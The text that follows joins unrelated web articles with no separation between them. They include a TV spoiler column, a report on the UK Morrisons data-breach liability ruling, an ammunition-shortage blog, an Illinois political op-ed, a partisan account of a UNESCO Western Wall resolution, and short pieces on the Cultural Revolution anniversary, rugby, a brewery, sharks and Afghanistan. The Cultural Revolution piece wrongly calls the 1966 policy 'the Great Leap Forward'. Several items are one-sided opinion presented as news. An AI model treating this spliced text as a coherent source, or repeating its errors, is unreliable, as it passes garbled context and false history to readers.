“Slowly, different characters are going to learn who Savitar is,” Danielle Panabaker shared during my visit to the set last week. “But I don't know if the audience is going to be told anytime soon.” Grant Gustin meanwhile told me, “It's not the same as past reveals,” explaining, “With Zoom and Reverse-Flash, the audience was starting to realize things before we all started to piece it together. But I don't know how you would know this year. And when you do find out, it's like, ‘Oh. My. God!' There are really no secrets or hints leading up to to it.”
Will we see any more Wizard of Oz-inspired storylines on Once Upon a Time this season? —Angelo
Episode 18 is one to watch for, Angelo. “What I love about my episode — besides the fact that they're ‘my episodes' — is that they are like little mini Wizard of Oz movies,” a beaming Rebecca Mader told me on set last week. “The Wizard of Oz fans should be really happy, because we introduce the Tin Man for the first time (played recent Flash guest star Alex Desert), we get monkeys, and we'll meet the [Cowardly] Lion as well. It's a really, really cool episode for my character.” (Bex then sneaked me a peek of her solo from the musical episode, and it looks wonderfully wicked.)
My heart breaks for Once Upon a Time‘s Regina. What will she do now that Robin has let her down? —E.J.
I asked Lana Parrilla if Regina will blame herself for bringing the Wish Realm's Robin of Locksley to Storybrooke, or if she will look sideways at Emma, who encouraged her to do so. “She blames herself to a degree,” Parrilla answered, “but she definitely blames another person — who I won't mention.”
Always looking for new Blindspot scoop! Will we be seeing more interaction between Weller and Shepherd this season? —Erin
“Yes, you will be, and it's hard-hitting,” Sullivan Stapleton said when I hand-delivered your question. “Shepherd has been observing him since he was young, paid his tuition…. With that link, you're like, ‘What's up, lady? What's going on?' That's what I love about our writers, how they throw the twists and turns in every week. It's a great story, and it's personal for Weller.” Bonus scoop: Archie Panjabi tells me that when the show returns on Wednesday, March 22, “Somebody who has been an enemy of the team actually joins the team, and helps them in their search for Sandstorm.”
Can you tell us anything about Supergirl‘s “Sanvers”? —Emma
During my visit to that CW series' set, Floriana Lima confirmed, “We're definitely going to learn a bit more about Maggie and how she came out of that whole ‘coming out' [experience].” What's more, in the Monday, March 27 episode, “An ex-girlfriend (played by Cedar Cove‘s Hayley Sales) shows up, and it's a shocking moment for Maggie to run into her — while Alex is with her,” Lima teased. “We are just walking outside of yoga class, and it was one of those moments where I was like, ‘Yeah, I've done that, run into an ex with a new partner!'” Scoop quiz: Now which half of “Sanvers” do you think is dragging the other to yoga?
VIDEOSThe Flash and Supergirl Get Retro Glam in Musical Crossover
Do you have any good Hawaii Five-0 scoop to share? —Belle
Being a red-blooded male, the return of Julie Benz is hella “good” in my book. Fresh off her Training Day Season 1 run, Benz will bring Abby back in Five-0‘s Season 7 finale — no, not to break up with Chin Ho (“That's a long-term relationship, at least in our eyes,” says show boss Peter M. Lenkov) — but to help the team dismantle the human trafficking ring that they uncovered this past Friday.
Will The Originals‘ Klaus try to revive Camille? And will Elijah and Hayley have a happy ending? –Alex
I wouldn't go throwing around words like “revive,” but the late, great Cami definitely has a presence in Season 4. In addition to a brief appearance — as teased in the official trailer — she's mentioned more often in Friday's premiere than certain other characters who are still alive. As for Elijah and Hayley, I can't promise you a happy ending… but I can promise you a dramatic reunion.
I happen to think that Stef and Lena from The Fosters are one of the best married couples on television, despite their kids' antics. I'd love to learn what's coming up specifically for them. Any news? —JennR
“Tonight's episode (airing at 8/7c on Freeform) culminates in a big, epic, romantic moment between Stef and Lena that is not to be missed,” executive producer Bradley Bredeweg teases.
Got any scoop on Grimm? —Jen
Friday's episode spends a significant amount of time on the Nick/Eve relationship (or whatever you want to call it) and fills us in on the scary skull face we've been seeing in the mirrors. Lest the Nadalind fans feel left out, next week's episode — the series' penultimate hour — features an Adalind/Nick moment that feels very important as the NBC drama hurtles toward its conclusion.
When is Sarah Paulson going to show up on FEUD: Bette and Joan? —Payton
Ryan Murphy's go-to award-winner appears as Geraldine Page in Episode 5, airing Sunday, April 2 and titled “And the Winner Is… (The Oscars of 1963).”
What's coming up for Chicago Fire‘s Severide now that Anna is moving to Chicago? –Carlynn
After everything the two have been through — her leukemia, his anesthesia-free bone marrow donation — a little bliss is in order. “They start an epic romance that includes ice skating!” executive producer Derek Haas previews.
Any scoop you have on Lucifer will do! —Addi
Regardless of what closed captioning might have assumed/told you, we are supposed to be wondering if Uriel cryptically told his brother, “The peace is here” or “The piece is here.” Stupid homonyms!
Can't wait for iZombie to return. Got any scoop to get us through to April? —Chelle
The Flash and Supergirl aren't the only ones showing off their pipes on The CW. During the first three episodes of iZombie‘s new season (pemiering Tuesday, April 4), David Anders' Blaine sings not once, not twice, but three times! The first tune is a fun nod to musician-not-series creator Rob Thomas, while the other two are courtesy of Blaine's new job.
Please tell me you have some S.H.I.E.L.D. scoop, this hiatus is interminable! — Serena
Until the bubble drama returns on Tuesday, April 4, all I can do is part with the few scraps left from my recent chat with showrunner Jed Whedon, who said that although we didn't get a little vignette of his Framework life, “[Director] Mace would be in there somewhere” as Daisy gets to exploring, while “we might” see the return of some other familiar faces (a la Brett Dalton's Ward). And with that, my cupboard of S.H.I.E.L.D. teasers is completely bare.

UK Court Says Company Is Innocent In Massive Data Breach Caused By Vindictive Employee, But Must Nonetheless Pay Compensation
from the who-said-life-is-fair? dept
It's well known that the EU has laws offering relatively strong protection for personal data -- some companies say too strong. Possible support for that viewpoint comes from a new data protection case in the UK, which follows EU law, where the judge has come to a rather surprising conclusion. Details of the case can be found in a short post on the Panopticon blog, or in the court's 59-page judgment (pdf), but the basic facts are as follows.
In 2014, a file containing personal details of 99,998 employees of the UK supermarket chain Morrisons was posted on a file-sharing Web site. The file included names, addresses, gender, dates of birth, phone numbers (home or mobile), bank account numbers and salary information. Public links to the file were placed elsewhere, and copies of the data sent on a CD to three local newspapers, supposedly by someone who had found it on the Internet. In fact, all the copies originated from Andrew Skelton, a Senior IT Auditor in Morrisons, as later investigations discovered. According to the court, Skelton had a grudge against the company because of a disciplinary process that took place in 2013. As a result of the massive data breach in 2014, Skelton was sentenced to eight years in prison.
The current case was brought by some 5,500 employees named in the leaks, who sought compensation from Morrisons. There were two parts to the claim. One was that Morrisons was directly to blame, and the other that it had "vicarious liability" -- that is, liability for the actions or omissions of others. The UK judge found that Morrisons was not directly liable, since it had done everything it could to avoid personal data being leaked. However, as the Panopticon blog explains:
having concluded that Morrisons was entirely legally innocent in respect of Skelton's misuse of the data, the Judge held that it was nonetheless vicariously liable for Skelton's misdeeds
That is a legal bombshell as far as UK privacy law is concerned, since it means that a company that does everything it reasonably can to prevent personal data being revealed can nonetheless be held vicariously liable for the actions of an employee, even a malicious one. That clearly offers an extremely easy -- if potentially self-damaging -- route for disgruntled employees who want to harm their employers. All they need to do is intentionally leak personal data, and the company they work for will have vicarious responsibility for the privacy breach. In fact, even the judge was worried by the implications of his own decision:
The point which most troubled me in reaching these conclusions was the submission that the wrongful acts of Skelton were deliberately aimed at the party whom the claimants seek to hold responsible, such that to reach the conclusion I have may seem to render the court an accessory in furthering his criminal aims.
As a result, the judge granted leave for Morrisons to appeal against his judgment that it was vicariously liable. Hundreds of thousands of companies around the UK will now be hoping that a higher court, either nationally or even at the EU level, overturns the ruling, and sets a limit on those super-strong data protection laws.

Try going to your neighborhood Wal-Mart to buy some .22 bullets for target shooting, or a couple of boxes of shotgun shells, and you'll discover what hunters and gun enthusiasts have been muttering about for months now: The shelves are bare.
Manufacturers are operating flat-out but can't keep up with demand, as consumers snap up every box of ammo as soon as it comes on the market. Wal-Mart limits buyers to three boxes when they're available, and Cabela's is limiting online orders to one box per day of the popular .22 long shells increasingly used as cheap ammo for target rifles and pistols.
The buying frenzy is understandable here in Connecticut, where the General Assembly recently tightened gun regulations in response to the Newtown school massacre. The new law includes a $35 permit to buy ammo that requires a background check and is good for five years -- until the legislature decides it can shorten the term and increase the fee as a new source of tax revenue.
But why the national shortage? Here's my theory: Bullets are easy to store, non-perishable, and they hold their value or even increase in times of crisis. So they're a lot like gold or any other commodity that has served as hard money through the ages (or even the canned mackerel fillets that serve as currency in U.S. prisons, according to this classic 2008 Wall Street Journal story). With states like Connecticut and Colorado passing strict new restrictions on gun owners and the President flying around the country to drum up support for national gun control, ammo buyers are like consumers queuing for gas or loading up on gold in the inflationary 1970s. They're creating their own shortage.
Like gold and canned mackerel, bullets are used for purposes other than storing value, but they also could be vulnerable to hoarding-induced speculation. All those silly Internet posts about the government buying trillions of bullets, which some see as a backdoor form of gun control, are one source of upward pressure on demand and prices even if the underlying premise is false (the government never purchases the amounts it puts out in requests for proposals). And the threat of stricter controls on gun and ammo purchases is the equivalent of the psychological warfare the Federal Reserve is waging on fixed-income investors with its well-publicized purchases of $80 billion a month in mortgage-backed securities. The Fed is driving up the price of bonds -- and potentially driving down the returns for people who hold them long-term. Are bullet owners running the same risk? This helpful FAQ from ATC's Federal Premium unit says bullets have a shelf life of about 10-years, meaning eventually the ammo that doesn't get shot or sold will have to be disposed of some other way. (Author's note: Please consider the source cited above, a manufacturer. We've all shot plenty of rounds past their expiration date, just as we've eaten expired mayonnaise. Or some of us have, anyway. The `helpful' part was supposed to be a hint, which failed miserably.)
It's difficult to get precise numbers on how many bullets are sold in the consumer market in the U.S. each year. The Treasury's Alcohol and Tobacco Tax and Trade Bureau (split off from the ATF a decade ago, not that anyone noticed) collects an 11% tax on ammo sales by manufacturers. That tax serves as a rough proxy for demand, and government statistics show receipts soared from $68 million in 2000 to $129 million in 2008 and $172 million in calendar 2009, President Obama's first full year in office. That would imply wholesale bullet sales of about $1.6 billion, or possibly retail sales of $3 billion. Consumer retail purchases of clothing and footwear last year, by comparison, were about $327 billion according to the Bureau of Economic Analysis.
It turns out 2009 may have been a high-water mark for ammo sales, since TTB statistics show tax receipts fell to $157 million in 2012 (the final number might be amended as manufacturers submit their final returns). Overall taxes on firearms and ammo have climbed over the Obama years due to rising gun sales, with the TTB's total take rising from $454 million in 2009 to $493 million last year. In the fiscal first quarter ended Dec. 30, the combined taxes on firearms and ammo climbed to $158 million, possibly implying a record-breaking $600 million fiscal year.
(Another aside: The TTB takes in $23 billion a year in taxes, making it the third-largest U.S. tax agency and probably the most efficient, generating $449 for every $1 it spends. The gun and ammo taxes are forwarded directly to the Fish and Wildlife Restoration Fund.)
Will today's ammo hoarders be rewarded like gold buyers in 1972, or will they wind up like the folks who bought Bitcoins at $30 and watched them fall to two bucks a couple years ago? (The current price, readers note, is above $200 in what some are calling a speculation-induced bubble.)
Let's look at the dynamics: A certain number of bullets are fired on shooting ranges, hunting preserves and street corners every year, although statistics are hard to find. But it's hardly a growth industry. The U.S. Fish and Wildlife Service's 2011 survey of fishing and hunting shows there were an estimated 13.7 million hunters who spent $34 billion on the sport. That's down from 14 million hunters who spent an inflation-adjusted $31 billion in 1996.
Michael Bazinet of the National Shooting Sports Foundation, an industry trade group based in Newtown, Conn., says the shooting market may be expanding thanks to an influx of new buyers including women. A 2011 survey of retailers found they reported 25% of their customers appeared to be new gun owners, Bazinet said, and the most recent Gallup poll found that 47% of Americans reported having a gun in the home.
"The demographic is spreading out," Bazinet said, and gun ranges "are busier than ever."
I called a few ammo manufacturers to get their views on future supply and demand, but they're press-shy in the wake of the Newtown shooting tragedy. Olin Corp. is one of the biggest U.S. manufacturers of civilian ammunition, generating about a third of its revenue from bullets. Olin's Winchester division is in the midst of a $110 million upgrade of its ammunition business, in which it is centralizing its operations in Oxford, Miss.
Once the upgrade is done, Olin says in its most recent 10-K, it will reduce Winchester's annual operating costs by $30 million. "Winchester expects to have the most modern centerfire ammunition production facility in North America," the company says.
Ammunition has been a good business for Olin lately, with total sales rising 8% to $618 million and profits climbing 46% to $55 million. The company's commercial backlog, most of it for civilian ammunition, has also soared from $38 million at the beginning of 2012 to $311 million as of Jan. 31. The company's shares are up 25% this year.
Federal Premium answers its own question, "why can't you just make more ammunition?" by saying it is already running its plants 24 hours a day. The company also says "there is some indication now that the shortages may be easing, aided in part by retailers' decisions to limit sales to each customer." Parent ATK, which has a large defense business, is up 17% this year.
How long will the shortages last? Given flat hunting participation, and assuming there hasn't been a step-change increase in target shooting in America, the hoarding will have to come to an end sooner or later. Consumers will run out of room to store the stuff. Olin projected in its 10-k that supplies will be tight "at least into the third quarter of 2013."
By then the Olin's 1,000-employee, 500,000 square-foot plant in Oxford should be humming. Will the guys who stuffed their garages with cases of Super-X Power Points and .38 magnum loads then be looking at it all and wondering, what have I done? Can I really shoot all this stuff?
(Note to more technically inclined readers: The .38 Magnum is properly speaking a .357 load, which is shot in a .38 pistol. The .22 long is formally known as .22 LR, for long rifle. There is an older form of .22 ammo called .22 long, just as there are many different types of shotgun shells in the same gauges, and different pellets for different shooting conditions. I didn't mention semiautomatics but what the hell, that term is driving readers nuts, too: They've been around at least since the original Browning humpback Auto-5 that came out in 1900 (although that was not the first). Other slang or shorthand in the above story does not indicate a lack of knowledge about the topic. Carry on.)
To subscribe to Capitol Fax, click here. Rep. Hays' blistering denunciation Wednesday, Jul 24, 2013 * Rep. Chad Hays (R-Catlin) recently penned a magnificently blistering op-ed on Gov. Pat Quinn's veto of legislative salaries due to the General Assembly's inaction on pension reform. Let's take it in pieces. First, the consequences… Today the issue is pension reform. What will the issue be tomorrow in terms of threatening the people's duly elected representatives? Will it be bullying them into accepting the temporary tax increase as permanent because the governor declares that to be the new “crisis”? What would downstate voters think if the governor had decided to hold hostage your legislator until he/she came around to his way of thinking on the right to carry issue? The truth is that one can insert any issue here, from any political point of view, and the conclusion is still the same. The precedent that this type of blackmail represents is reprehensible and has no place in the governance model held up as the gold standard around the world. […] Even a fledgling third world republic would not allow a governor to shake down the people's elected representatives. This type of heavy-handed thuggery might pass for democracy in some parts of the world (generally identifiable by the marching in the streets to overthrow the leadership), but not in the 104th District. The vote is not for sale, even when car payments begin to be missed. This is a Blagojevich-style circus stunt. * The alternative bill… There was absolutely no need for the Legislature to adjourn the spring session without a pension reform bill in place. Senate Bill 2404 would have passed the House with a veto-proof majority had the speaker called the bill. It had previously passed with 40 of the 59 votes in the Senate. […] The notion that it is acceptable to hold legislators for ransom because they have serious concerns about the approach in Senate Bill 1 favored by the speaker and others is outrageous on its face. Scholars who have looked at that plan found it blatantly unconstitutional at worst and at best extraordinarily punitive toward retirees who did their part and played by the rules. Regardless of the constitutional debate, the bill only received 16 of the 30 necessary votes in the Senate. Not a close call. Please do not confuse the speaker's unwillingness to call a vote on SB 2404 with some newly discovered fiscal conscious. He presided over $2 billion in supplemental spending over and above the FY 2012/2013 budget this spring alone. Critics suggested that SB 2404 would not save enough money. That is primarily because only one-third of the savings are sent back into stabilizing the system, largely due to the majority party favoring spending the rest on other initiatives. I suggest an amendment that rolls ALL of the savings from this concept back into the pension system. * Media coverage of the governor's veto… How is it possible that the Midwest's largest newspaper is silent on the matter of the bill favored by the majority of the House not being called for a vote, but issues an endorsement of a gubernatorial tactic that can reasonably be termed grandstanding by a desperate politician? I think I just heard Thomas Jefferson gasp. That a publication as prominent as the Chicago Tribune would state on its front page that this tactic is appropriate is mind-boggling. The editorial board must be meeting at Mike Royko's old table at the Billy Goat Tavern making decisions such as these in the early afternoon between refrains of “It's Five O'Clock Somewhere.” I direct you to the Constitution and the concept of co-equal branches of government. Sometimes political theater needs interpretation. There was a day when the media employed excellent investigative reporters who helped the public sift through the talking points and blather. Some still do (including The News-Gazette, with Tom Kacich), but many now have their own political agendas, or simply can no longer afford the veteran reporter who can decode the Springfield nonsense. In light of this painful reality, let me help. The governor has established a pattern of sitting out the discussion on a myriad of issues, only to issue grandiose statements after the fact. He is remarkably unskilled in terms of navigating the legislative process and has few identifiable allies in the General Assembly; a strange and crippling combination for a chief executive. He is, however, populist enough to understand that most media outlets will follow any shiny object without digging beneath the surface. He conjures up “they are not doing their job … don't pay them.” No culpability for him as a leader, no call for even a single idea or creative thought. The media goes into a frenzy. * Conclusion… Leaders lead. Pretenders hide in the shadows and hold press conferences hundreds of miles from the Capitol. Unilaterally declaring in the fashion of a barfly on his ninth beer “don't pay the bums” sounds great at the corner tap. Don't confuse this with governing, governor. It more readily defines a grifter. We are not for sale in the 104th District and have no earthly intention of being intimidated. The people themselves will retain 100 percent of the responsibility of deciding who will be paid to represent them at our Capitol. Not you. Discuss. - Posted by Rich Miller

Proposal, likely to pass due to Muslim majority, would have Kotel renamed Buraq Plaza and made part of Al-Aqsa Mosque.
In an attempt to gain international legitimacy for its rewriting of history, the Palestinian Authority (PA) will submit a resolution to UNESCO (UN Educational, Scientific and Cultural Organization) next week claiming the Kotel (Western Wall) as its own.
The proposal calls to have the Kotel in Jerusalem - which is an outer wall of the Temple Mount that is the holiest site in Judaism - recognized as part of Al-Aqsa Mosque located on the Mount, reports Yedioth Aharonoth on Friday.
The PA is not a member of the UNESCO Executive Council, and therefore the proposal will be submitted for a vote next week on its behalf by the six Arab member states of Algeria, Egypt, Kuwait, Morocco, Tunisia and the United Arab Emirates (UAE).
Senior Israeli sources revealed that the PA is working in parallel to have the proposal submitted at the UNESCO plenum, where the PA is recognized as a state.
In response, Israel is working behind the scenes to rally opposition to the proposal, although there is an automatic Muslim majority making its adoption all but certain.
A copy of the proposal reveals its main points, which begin with the call "to declare and confirm that the Western Wall is part of Al-Aqsa Mosque, and is called Buraq Plaza. The same applies to the Mughrabi Gate."
Buraq Plaza refers to the "Al-Buraq" Wall, a name given by Muslims to the Kotel in the 1920s in an attempt to claim it. The name refers to Mohammed's "winged steed" he supposedly rode to Jerusalem in his "night journey."
The PA has long tried to revise history and claim the Kotel as the "Al-Buraq" Wall, most recently in a call by PA Grand Mufti Sheikh Mohammed Hussein this August.
"Condemn Israel - for everything"
The proposal continues, demanding that the world condemn Israel over calls to have its citizens carry firearms to defend themselves from the recent Arab terror wave, in an apparent reference to Jerusalem Mayor Nir Barkat's recent comment.
It likewise calls for condemnation of IDF security actions in Jerusalem, "the occupied capital of Palestine," and condemnation of Israel for excavations near the Temple Mount, where archaeologists have been forced to comb through rubble after Arabs demolish ancient Jewish artifacts on the Mount.
The proposal demands condemnation of "Israeli aggression and illegal measures taken against the freedom of worship and access of Muslim to al-Aqsa Mosque and Israel's attempts to break the status quo since 1967."
Despite the false claim that Israel has recently changed the status quo on the Mount, the Jordanian Waqf in fact continues to hold de facto control and bans Jewish prayer in spite of Israeli law stipulating freedom of worship.
Security forces have prevented Arab access to the Mount occasionally as a preventative measure, given frequent violent Arab riots that have seen the Al-Aqsa Mosque turned into a terror base from which rocks and explosives are hurled at police.
The proposal went on, calling for a condemnation of "attacks" against the Mosque by Jewish "extremists, and even condemning Israel for building a light rail into the eastern and northeastern part of its capital, in a move that was meant to ease transportation for Arab residents before they destroyed three rail stations last summer.
The Kotel isn't the only Jewish site that the PA seeks to usurp in the proposal, which also calls to have the Cave of Machpelah in Hevron - where the Jewish patriarchs and matriarchs are buried other than Rachel - as well as Rachel's Tomb in Bethlehem, declared "part of Palestine."
Driving the attempt to claim Rachel's Tomb is the recent Muslim revision according to which it is the grave of Bilal ibn Rabah, a companion of Mohammed, who was never in Israel.
Finally, the proposal condemns alleged Jewish violence meant to change the "character" of Hevron, the ancient Biblical city in Judea where the Jewish patriarchs and matriarchs lived.
"Palestinian lies are a world heritage"
In response to the bevy of calls in the proposal, Israeli Ambassador to UNESCO Carmel Shama Hacohen accused the PA of continuing the incitement to terror.
"The Palestinians continue to add fuel to the fire of incitement and ongoing terror," Shama Hacohen said. "In my first speech to UNESCO last year I warned the world's countries that false incitement by the Palestinians against Israel especially regarding the Temple Mount means playing with fire. At the last conference in Bonn, I suggested registering the Palestinian culture of lies as an intangible world heritage site."
"The new proposal is tantamount to pouring fuel on the fire of incitement and ongoing terror instead of being responsible and calming the situation down," noted the ambassador.
"Of course we must not despair or get alarmed, as they have lies whereas we have the ethical, realistic and historical truth, and it will triumph. The Jewish people and the Western Wall are one and the chances of the Palestinians to Islamize the Western Wall are the same as the chances of Islamizing the Jewish people. Even the morning after the vote the Israeli flag will fly over the wall."
"We pay a high cost for our existence in our country, but there is no responsible partner able to reduce this cost in the near future, because apart from the question of their right to a state in our country, their conduct raises a critical question regarding their ability to act as a responsible country, and this is the saddest conclusion from the Palestinian's conduct at UNESCO,” she concluded.
The Chinese media largely ignored a notable anniversary in the country's history on Monday as authorities continued to suppress discussion of some of the Communist Party's more violent chapters. Exactly 50 years ago, the party's Politburo met to launch what would become known as the Cultural Revolution.
On May 16, 1966, high-ranking politicians met in Beijing to purge several top officials who had fallen out of favor with leader Mao Zedong. The summit also produced a document that outlined the Party's new course of "the Great Leap Forward," i.e., the mass mobilization of citizens into collectives dedicated to a single industry or crop, and the destruction of the "Four Olds," or an ideological break with traditional Chinese customs.
The policy lasted for a decade until Mao's death in 1976. It has come to be regarded as a "catastrophe," for the violent persecution, famine and exile of educated youths to the countryside that came of it.
Violent clashes between rival factions
Following quotations in Mao's "Little Red Book," rival factions of student paramilitary groups known as Red Guards began to battle each other over ideological purity, creating a climate of fear so volatile that many refused to oppose them.
The Communist Party has acknowledged the disastrous nature of the Cultural Revolution, but mostly exonerated Mao, whose immense portrait still hangs from the famous Tiananmen Gate in central Beijing.
Censors clamped down on mentions of the anniversary on social media over the weekend. However, there were a few published reports on the event on Monday. Phoenix TV, one of the few privately owned stations allowed to operate in mainland China, interviewed young people to ask their thoughts on the Cultural Revolution, getting responses like "idealism" and "confusion."

England will follow up their opening RBS 6 Nations victory over Scotland by aiming for a Valentine's Day massacre of Italy in Rome, warned Eddie Jones.
The new head coach wants a more compelling triumph next Sunday, with only England and France now capable of a Grand Slam. Despite Italy's gallant near-miss in Paris, Jones is confident England can run riot in the Eternal City.
'We want to go out there and smack Italy next week,' said the Australian. 'I said to the boys already that's our aim: to go out there and give them a good hiding. 'They're going to be tough because they should have won today, but that's our aim. They're ranked 12th in the world. I don't know what it's called — the Panini Cup? We'll win it!'
England head coach Eddie Jones expects a far different game against Italy in Rome but he is confident
Dylan Hartley celebrates winning the Calcutta Cup against Scotland with team-mate James Haskell
There is actually no trophy for Italy v England matches. England opted to resort to a territorial game and eventual set-piece supremacy against Scotland, but Jones believes they can expand their repertoire in Rome.
'It will be different conditions in Italy,' he said. 'Glen Jackson's the referee and he favours attacking teams that keep the ball, so we'll be able to play a bit more and it should be a faster deck. If we get those conditions we want to move the ball.'
But there were no regrets about a no-frills approach in Edinburgh, as Jones added: 'It's all about winning. Fans like winning teams.
But the big payoff for Dunham is about to begin — Eloi and Sébastien and the team have prepared themselves for an expansion and a launch into the US market via Shelton Brothers. This little brewpub on the brink of never mattering at all has developed a lust-worthy series of beers that the US market is primed to seek out. Saison, farmhouse, Brett, barrel-aged, and soon, more spontaneous fermentation — these are the words that the most progressive segments of the US beer market are made of. Their ability to brew at the highest levels, and build relationships in the fledgling subculture of North American farmhouse ales proved valuable as they wandered the halls of The Fest this past fall in San Pedro, California. The Fest is a Shelton Brothers collaboration with Brouwerij West featuring friends and family of the Shelton Brothers global import portfolio. “We're going to brew a collaboration with Jester King!” Eloi excitedly told me after we recorded a session for the podcast. “I truly can't believe it!” Their moment was arriving.
Collaborations are also in the works with 4 Hands Brewing in St. Louis, which will result in a hoppy brett Saison called ''Hugo Saison," and the crew from Mystic Brewing in Massachussets is heading north to brew with Dunham soon.
The expansion is well underway. A new 30bbl brewhouse from BCast in Ohio will enable Dunham to jump from 1,700 barely to 3,000 in the next year, and a cellar of 100 barrels, mostly wine from the Niagara Valley in Ontario, alongside a mix of California wine barrels, bourbon, tequila, rum, and brandy will enable Eloi and the team to explore further into the dark arts of aging. This week he got ahold of some cognac and Armagnac barrels, and promptly brewed a Russian Imperial Stout to store away in them for coffee blending later on. They just purchased 100 barrels of freshly emptied Chianti wines from Castello di Brolio, and plan to top 250 wood barrels by the end of the year.
Mossad chief Meir Dagan visited Saudi Arabia recently, if unofficial reports published over the weekend on the WorldNetDaily website are accurate. The Internet news site attributed the story to Arab sources.
According to the reports, the talks conducted in Saudi Arabia with the head of Israel's espionage agency dealt with Iran and its nuclear program. The account follows a series of recent reports on increasing secret cooperation between Israel and the Saudis, including defense coordination on matters related to possible military action against Iran's nuclear facilities.
Former Mossad chief Meir Dagan
Two months ago, the Times of London reported that during the course of a Saudi military exercise, air defense system operations were halted for a few hours to rehearse a scenario whereby Israeli fighter planes would cross Saudi Arabian airspace en route to an attack on Iran.
Arab and Iranian media outlets have also reported Israeli air force planes and helicopters landing in Saudi Arabia for the purposes of positioning equipment there.
Three weeks ago, it was reported that the United Arab Emirates' ambassador in Washington said at a conference that the consequences of nuclear weapons in the hands of the Iranians would be more serious than an Israeli assault, because a nuclear Iran could not be tolerated. His remarks reflect a common concern felt in Israel and the Persian Gulf states over nuclear weapons in Iranian hands.
Three people were taken into a custody after a pursuit that ended in Seal Beach on Sunday, August 9, 2015.
Three people were taken into custody Sunday morning after breaching the perimeter of the Naval Weapons Station at Seal Beach during a pursuit.
Police began the pursuit for burglary suspects in Westminster shortly after 4:30 a.m. and followed the vehicle with the three people on the 405 Freeway, authorities said. At least one person had a handgun.
The pursuit ended off the 405 Freeway on Bolsa Chica Street in Seal Beach. One person was taken into custody, but the other two people, including one who was armed, fled on foot into the Naval Weapons Station.
Both people were found and all three suspects were taken into custody without incident.

I've noticed that frequently in technical discussions, the strongest disagreements seem to come from people with little to no actual experience with the technology they're arguing against. How can that be? For example:
Test-First Development. I wish I had a dollar for every time I've suggested to a developer that writing their tests before or along with writing their code will make the code not only easier to write but also more robust coming out of the gate, and I get back responses like, “What? That's crazy! How can you write tests before you have any code? That doesn't make any sense!” Having an initial reaction like that isn't such a big deal, as I've seen numerous developers who have such reactions actually try the “test first” approach and quickly become strong advocates who wonder how they ever did without it. The point is, though, that they actually tried it. Arguing with them before they tried it always turned out to be a total waste of time. No amount of words seemed to convince them. They had to experience it before they understood it.
Erlang syntax. Erlang is getting more and more attention these days, and rightfully so, but a typical reaction from those who have written little to no Erlang code is that the language's syntax is too weird, too hard to read and write, etc. Is the syntax different? Yes. Is it weird or difficult? No, not at all — in fact, it's actually very simple and regular when compared to popular general-purpose imperative languages. Spend a day or two writing some real Erlang code, and I guarantee you that any initial dislike you might have for its syntax will disappear.
REST. If you search the blog of any REST proponent, including this one, you're sure to find all kinds of comments from detractors who argue against REST despite never having used it to develop any real systems. Similarly, the blogs of many WS-* advocates who have never tried using REST contain all kinds of reasons why REST can't possibly work. Check out the comments in Damien Katz's recent “REST, I just don't get it” posting, for example; you have useful ones from those who have obviously used REST and understand its benefits, and then you have other comments that argue against REST while simultaneously showing a great misunderstanding of it. Those detractors would do well to read Bill de hÓra's excellent response.
Also interesting about these three particular cases is that I don't personally know of anyone who's actually tried the approaches and decided against them. In a posting last November, for example, I asked for comments from anyone who had actually tried REST for real and with an open mind, but decided that it was inferior to WS-* and so abandoned it. Either nobody read that posting or no such people exist. I'm fairly confident it's the latter.
There will always be arguments made by people whose livelihood is somehow threatened by the approach they're opposing, but I don't think that's the source of all the opposing arguments. As developers we can't possibly try everything, of course, because there just isn't enough time. It's inevitable that we'll sometimes have to resort to researching an approach via only reading, questions and discussion and decide against it without prototyping. But ultimately we developers owe it to ourselves and our employers to keep ourselves objectively informed so that we can take advantage of new approaches whenever appropriate. When a whole bunch of smart developers have success with a particular approach, I don't see how any responsible developer can actively and vocally oppose it without first objectively trying the approach and experiencing it firsthand.
Research conducted in Bimini in The Bahamas spanning almost two decades shows that female lemon sharks that were born there returned 15 years later to give birth to their own young, confirming this behavior for the first time in sharks. Credit: Matt Potenski
STONY BROOK, N.Y., Dec. 6 (UPI) -- Female sharks return to their birthplace to give birth, like salmon and sea turtles, U.S. researches report at the end of an almost 20-year study.
Begun in 1995, the study involved the capture, tagging, release and tracking of more than 2,000 baby lemon sharks. The ongoing project yielded the first confirmation of the "homing" behavior in sharks, the researchers reported.
The study was conducted in Bimini in the Bahamas.
"We found that newborn sharks captured in the mid-1990s left the safety of the islands when they were between 5 and 8 years old," researcher Kevin Feldheim of Chicago's Field Museum said.

"Yet, despite leaving and visiting many other islands in their travels, these sharks 'remember' where they were born after a decade of roving, and are able to find the island again when they are pregnant and ready to give birth," he said.
Scientists have long speculated female sharks have the ability to home back to their birthplace to give birth, but the difficulty of keeping track of sharks from birth to maturity has made confirmation of the behavior a struggle, the researchers said.
Many hundreds of student volunteers came to the Bahamas to help with the 19-year ongoing research effort to prove the speculation was true, a release from the Institute for Ocean Conservation Science at Stony Brook University in New York said.
Evidence that sharks utilize the same nursery areas across generations underscores the critical importance of preserving local nursery habitats and can provide strong input in designating inshore marine reserves that would protect sharks of future generations, the researchers said.
The Los Angeles Times released a set of photos on Wednesday that appear to show U.S. troops in Afghanistan posing with the remains of suicide bombers. An American soldier released the photos to the LA Times "on the condition of anonymity."
International Security Assistance Force (ISAF) commander in Afghanistan Gen. John Allen 'strongly condemned' the photos. In a statement, ISAF clarified that the incident took place in 2010 and "represents a serious error in judgment by several soldiers who have acted out of ignorance and unfamiliarity with U.S. Army values."
According to NBC News, the Pentagon press secretary said Secretary of Defense Leon Panetta 'strongly rejects the conduct' of the soldiers depicted in the photos. Afghan President Hamid Karzai's spokesman declined to comment.
The anonymous soldier who released the photos to the LA Times reportedly told the paper that he released the photos to highlight security shortcomings at U.S. bases in Afghanistan. "He said the photos point to a breakdown in leadership and discipline that he believed compromised the safety of the troops," the LA Times reported.
The released images are the latest in a series of scandals involving U.S. forces that have put pressure on the United States' already-strained relations with Afghanistan.
In January, a video of U.S. Marines urinating on dead bodies of Taliban members sparked outrage. The burning of Qurans at a NATO airbase in February spurred week-long riots that killed dozens. In March, a U.S. army sergeant allegedly massacred 17 civilians in Afghanistan.
Last weekend, insurgents launched a coordinated attack on the capital Kabul as well as attacks in Nangarhar, Logar, and Paktia provinces.
Read more from Reuters below:
